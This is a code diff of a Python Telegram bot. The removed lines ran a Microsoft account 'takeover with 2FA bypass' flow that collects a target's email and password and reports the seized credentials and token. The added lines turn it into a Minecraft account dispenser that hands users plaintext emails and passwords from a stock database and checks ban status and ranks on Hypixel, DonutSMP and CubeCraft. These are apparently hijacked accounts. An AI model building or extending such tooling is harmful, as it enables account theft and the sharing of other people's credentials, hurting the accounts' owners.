+        account = db.get_account_by_user(update.effective_user.id)
         
-        context.user_data['email'] = email
-        await update.message.reply_text(f"Step 2: Enter password for {email}:")
-        return WAITING_PASSWORD
-
-    async def password_received(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        password = update.message.text.strip()
-        context.user_data['password'] = password
+        if not account:
+            await update.message.reply_text(
+                "❌ You don't have any account claimed.\n"
+                "Use /start and click 'GET ACCOUNT'."
+            )
+            return
         
+        await self._display_account(update, account)
+
+    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not await self._check_auth(update):
+            return
+        
+        stats = db.get_stats()
         await update.message.reply_text(
-            "Step 3: Enter new password (8+ chars):"
+            f"📊 ACCOUNT STATISTICS\n"
+            f"═══════════════════════════\n\n"
+            f"📦 Total accounts: {stats['total']}\n"
+            f"✅ Available: {stats['available']}\n"
+            f"🔒 Claimed: {stats['claimed']}\n"
         )
-        return WAITING_NEW_PASSWORD
 
-    async def new_password_received(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        new_password = update.message.text.strip()
-        if len(new_password) < 8:
-            await update.message.reply_text("Password too short. Try again:")
-            return WAITING_NEW_PASSWORD
+    async def release_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not await self._check_auth(update):
+            return
         
-        email = context.user_data.get('email')
-        password = context.user_data.get('password')
+        account = db.get_account_by_user(update.effective_user.id)
         
+        if not account:
+            await update.message.reply_text("❌ You don't have any account to release.")
+            return
+        
+        db.release_account(account["id"])
         await update.message.reply_text(
-            f"🔄 Attempting takeover with 2FA bypass...\n"
-            f"Target: {email}\n"
-            f"Trying 8 bypass methods..."
+            f"✅ Released account {account['email']} back to stock.\n"
+            f"Use /start to get another."
+        )
+
+    async def _display_account(self, update: Update, account: Dict):
+        hypixel_status_emoji = "🟢" if account["hypixel_status"] == "online" else "🔴" if account["hypixel_status"] == "offline" else "⚪"
+        donut_status_emoji = "🟢" if account["donutsmp_status"] == "online" else "🔴" if account["donutsmp_status"] == "offline" else "⚪"
+        cubecraft_status_emoji = "🟢" if account["cubecraft_status"] == "online" else "🔴" if account["cubecraft_status"] == "offline" else "⚪"
+        
+        bedrock_emoji = "✅ YES" if account["bedrock_owned"] else "❌ NO"
+        
+        message = (
+            f"📋 YOUR ACCOUNT\n"
+            f"═══════════════════════════\n\n"
+            f"📧 Email: {account['email']}\n"
+            f"🔑 Password: {account['password']}\n"
+            f"👤 Username: {account['username']}\n\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"🟡 HYPIXEL\n"
+            f"   Status: {hypixel_status_emoji} {account['hypixel_status']}\n"
+            f"   Rank: {account['hypixel_rank']}\n"
+            f"   Banned: {'✅ YES' if account['hypixel_banned'] else '❌ NO'}\n\n"
+            f"🟠 DONUTSMP\n"
+            f"   Status: {donut_status_emoji} {account['donutsmp_status']}\n"
+            f"   Banned: {'✅ YES' if account['donutsmp_banned'] else '❌ NO'}\n"
+            f"   Kills: {account['donutsmp_kills']} | Deaths: {account['donutsmp_deaths']}\n\n"
+            f"🟢 CUBECRAFT\n"
+            f"   Status: {cubecraft_status_emoji} {account['cubecraft_status']}\n"
+            f"   Rank: {account['cubecraft_rank']}\n"
+            f"   Banned: {'✅ YES' if account['cubecraft_banned'] else '❌ NO'}\n\n"
+            f"🎮 BEDROCK EDITION\n"
+            f"   Owned: {bedrock_emoji}\n"
         )
         
-        result = await MicrosoftAccountManager.takeover_account(
-            email, password, new_password
-        )
+        keyboard = [
+            [InlineKeyboardButton("🔄 REFRESH STATUS", callback_data=f"refresh_{account['id']}")],
+            [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
         
-        response = "🔐 TAKEOVER RESULTS\n"
-        response += "═══════════════════════════\n\n"
-        
-        for step in result.get("steps", []):
-            response += f"{step}\n"
-        
-        if result.get("success"):
-            creds = result.get("credentials", {})
-            response += f"\n✅ ACCOUNT TAKEOVER SUCCESSFUL!\n\n"
-            response += f"📧 Email: {creds.get('email')}\n"
-            response += f"🔑 Password: {creds.get('password')}\n"
-            if creds.get('access_token'):
-                response += f"🔐 Token: {creds.get('access_token')[:30]}...\n"
+        if isinstance(update, Update) and update.message:
+            await update.message.reply_text(message, reply_markup=reply_markup)
         else:
-            response += f"\n❌ TAKEOVER FAILED\n\n"
-            response += f"Error: {result.get('error', 'Unknown')}"
-        
-        context.user_data.clear()
-        await update.message.reply_text(response)
-        return ConversationHandler.END
-
-    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        await update.message.reply_text("❌ Cancelled.")
-        context.user_data.clear()
-        return ConversationHandler.END
+            # For callback queries
+            await update.effective_message.edit_text(message, reply_markup=reply_markup)
 
     async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         query = update.callback_query
         await query.answer()
+        
+        try:
+            if query.data == "get_account":
+                # Check if user already has an account
+                existing = db.get_account_by_user(update.effective_user.id)
+                if existing:
+                    await query.edit_message_text(
+                        f"❌ You already have an account claimed!\n\n"
+                        f"📧 Email: {existing['email']}\n"
+                        f"Use /myaccount to view it.\n"
+                        f"Use /release to release it back."
+                    )
+                    return
+                
+                account = db.get_available_account()
+                
+                if not account:
+                    await query.edit_message_text(
+                        "❌ No accounts available!\n"
+                        "All accounts have been claimed."
+                    )
+                    return
+                
+                # Check server status (simulated)
+                server_data = await ServerChecker.check_all(
+                    account["email"], 
+                    account["password"]
+                )
+                
+                # Update account with server data
+                db.update_server_status(account["id"], server_data)
+                account.update(server_data)
+                
+                # Claim the account
+                db.claim_account(account["id"], update.effective_user.id)
+                
+                # Get updated stats
+                stats = db.get_stats()
+                
+                # Build display message
+                hypixel_emoji = "🟢" if account["hypixel_status"] == "online" else "🔴" if account["hypixel_status"] == "offline" else "⚪"
+                donut_emoji = "🟢" if account["donutsmp_status"] == "online" else "🔴" if account["donutsmp_status"] == "offline" else "⚪"
+                cubecraft_emoji = "🟢" if account["cubecraft_status"] == "online" else "🔴" if account["cubecraft_status"] == "offline" else "⚪"
+                bedrock_emoji = "✅ YES" if account["bedrock_owned"] else "❌ NO"
+                
+                message = (
+                    f"🎮 ACCOUNT CLAIMED!\n"
+                    f"═══════════════════════════\n\n"
+                    f"📧 Email: {account['email']}\n"
+                    f"🔑 Password: {account['password']}\n"
+                    f"👤 Username: {account['username']}\n\n"
+                    f"━━━━━━━━━━━━━━━━━━━\n"
+                    f"🟡 HYPIXEL\n"
+                    f"   Status: {hypixel_emoji} {account['hypixel_status']}\n"
+                    f"   Rank: {account['hypixel_rank']}\n"
+                    f"   Banned: {'✅ YES' if account['hypixel_banned'] else '❌ NO'}\n\n"
+                    f"🟠 DONUTSMP\n"
+                    f"   Status: {donut_emoji} {account['donutsmp_status']}\n"
+                    f"   Banned: {'✅ YES' if account['donutsmp_banned'] else '❌ NO'}\n"
+                    f"   Kills: {account['donutsmp_kills']} | Deaths: {account['donutsmp_deaths']}\n\n"
+                    f"🟢 CUBECRAFT\n"
+                    f"   Status: {cubecraft_emoji} {account['cubecraft_status']}\n"
+                    f"   Rank: {account['cubecraft_rank']}\n"
+                    f"   Banned: {'✅ YES' if account['cubecraft_banned'] else '❌ NO'}\n\n"
+                    f"🎮 BEDROCK EDITION\n"
+                    f"   Owned: {bedrock_emoji}\n\n"
+                    f"📊 Remaining stock: {stats['available']}\n\n"
+                    f"✅ This account is YOURS only.\n"
+                    f"📌 Use /myaccount to view it anytime.\n"
+                    f"📌 Use /release to give it back."
+                )
+                
+                keyboard = [
+                    [InlineKeyboardButton("📋 MY ACCOUNT", callback_data="myaccount")],
+                    [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")]
+                ]
+                reply_markup = InlineKeyboardMarkup(keyboard)
+                
+                await query.edit_message_text(message, reply_markup=reply_markup)
+            
+            elif query.data == "view_stats":
+                stats = db.get_stats()
+                await query.edit_message_text(
+                    f"📊 ACCOUNT STATISTICS\n"
+                    f"═══════════════════════════\n\n"
+                    f"📦 Total accounts: {stats['total']}\n"
+                    f"✅ Available: {stats['available']}\n"
+                    f"🔒 Claimed: {stats['claimed']}\n\n"
+                    f"📌 Each account can only be claimed once.\n"
+                    f"📌 Use /release to return your account."
+                )
+            
+            elif query.data == "myaccount":
+                account = db.get_account_by_user(update.effective_user.id)
+                
+                if not account:
+                    await query.edit_message_text(
+                        "❌ You don't have any account claimed.\n"
+                        "Use /start and click 'GET ACCOUNT'."
+                    )
+                    return
+                
+                await self._display_account(query, account)
+            
+            elif query.data.startswith("refresh_"):
+                # Refresh specific account status
+                parts = query.data.split("_")
+                if len(parts) > 1 and parts[1].isdigit():
+                    account_id = int(parts[1])
+                    account = db.get_account_by_user(update.effective_user.id)
+                    
+                    if not account or account["id"] != account_id:
+                        await query.edit_message_text("❌ Account not found or not yours.")
+                        return
+                    
+                    await query.edit_message_text("🔄 Refreshing server status...")
+                    
+                    server_data = await ServerChecker.check_all(
+                        account["email"], 
+                        account["password"]
+                    )
+                    
+                    db.update_server_status(account_id, server_data)
+                    account.update(server_data)
+                    
+                    await self._display_account(query, account)
+                else:
+                    # Refresh all statuses for user's account
+                    account = db.get_account_by_user(update.effective_user.id)
+                    if not account:
+                        await query.edit_message_text("❌ No account claimed.")
+                        return
+                    
+                    await query.edit_message_text("🔄 Refreshing server status...")
+                    
+                    server_data = await ServerChecker.check_all(
+                        account["email"], 
+                        account["password"]
+                    )
+                    
+                    db.update_server_status(account["id"], server_data)
+                    account.update(server_data)
+                    
+                    await self._display_account(query, account)
+            
+            elif query.data == "refresh_status":
+                account = db.get_account_by_user(update.effective_user.id)
+                if not account:
+                    await query.edit_message_text("❌ No account claimed.")
+                    return
+                
+                await query.edit_message_text("🔄 Refreshing server status...")
+                
+                server_data = await ServerChecker.check_all(
+                    account["email"], 
+                    account["password"]
+                )
+                
+                db.update_server_status(account["id"], server_data)
+                account.update(server_data)
+                
+                await self._display_account(query, account)
+                
+        except Exception as e:
+            logger.error(f"Callback error: {e}")
+            await query.edit_message_text(f"Error: {str(e)}")
+
+    async def _display_account(self, update_obj, account: Dict):
+        hypixel_emoji = "🟢" if account["hypixel_status"] == "online" else "🔴" if account["hypixel_status"] == "offline" else "⚪"
+        donut_emoji = "🟢" if account["donutsmp_status"] == "online" else "🔴" if account["donutsmp_status"] == "offline" else "⚪"
+        cubecraft_emoji = "🟢" if account["cubecraft_status"] == "online" else "🔴" if account["cubecraft_status"] == "offline" else "⚪"
+        bedrock_emoji = "✅ YES" if account["bedrock_owned"] else "❌ NO"
+        
+        message = (
+            f"📋 YOUR ACCOUNT\n"
+            f"═══════════════════════════\n\n"
+            f"📧 Email: {account['email']}\n"
+            f"🔑 Password: {account['password']}\n"
+            f"👤 Username: {account['username']}\n\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"🟡 HYPIXEL\n"
+            f"   Status: {hypixel_emoji} {account['hypixel_status']}\n"
+            f"   Rank: {account['hypixel_rank']}\n"
+            f"   Banned: {'✅ YES' if account['hypixel_banned'] else '❌ NO'}\n\n"
+            f"🟠 DONUTSMP\n"
+            f"   Status: {donut_emoji} {account['donutsmp_status']}\n"
+            f"   Banned: {'✅ YES' if account['donutsmp_banned'] else '❌ NO'}\n"
+            f"   Kills: {account['donutsmp_kills']} | Deaths: {account['donutsmp_deaths']}\n\n"
+            f"🟢 CUBECRAFT\n"
+            f"   Status: {cubecraft_emoji} {account['cubecraft_status']}\n"
+            f"   Rank: {account['cubecraft_rank']}\n"
+            f"   Banned: {'✅ YES' if account['cubecraft_banned'] else '❌ NO'}\n\n"
+            f"🎮 BEDROCK EDITION\n"
+            f"   Owned: {bedrock_emoji}\n\n"
+            f"Use /release to give this account back."
+        )
+        
+        keyboard = [
+            [InlineKeyboardButton("🔄 REFRESH STATUS", callback_data=f"refresh_{account['id']}")],
+            [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        if hasattr(update_obj, 'edit_message_text'):
+            await update_obj.edit_message_text(message, reply_markup=reply_markup)
+        else:
+            await update_obj.message.reply_text(message, reply_markup=reply_markup)
 
     def run(self):
-        logger.info("Bot starting...")
+        logger.info("Minecraft Account Bot starting...")
         try:
             self.app.run_polling()
         except Exception as e:
@@ -503,5 +706,6 @@ if __name__ == "__main__":
     if not BOT_TOKEN:
         logger.error("BOT_TOKEN not set.")
         sys.exit(1)
+    
     bot = MinecraftBot(BOT_TOKEN)
     bot.run()
